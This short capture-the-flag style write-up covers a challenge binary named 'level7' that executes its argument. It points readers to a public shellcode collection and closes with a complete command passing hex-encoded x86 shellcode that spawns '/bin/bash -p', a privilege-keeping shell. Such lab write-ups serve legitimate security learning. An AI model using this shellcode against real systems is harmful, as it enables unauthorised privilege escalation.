A good place to find shellcodes is: shell-storm.org/shellcode/
It's a great resource with a collection of many different kind of shellcodes.
Eventually you have to write shellcode yourself, to pass any kind of restrictions.
But for the start, basic shellcode is sufficient.

So the program will just execute anything that is read from the arguments. It's important that the string doesn't contain a nullbyte. So just use echo to pass the shellcode to the binary.

./level7 `echo "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"`
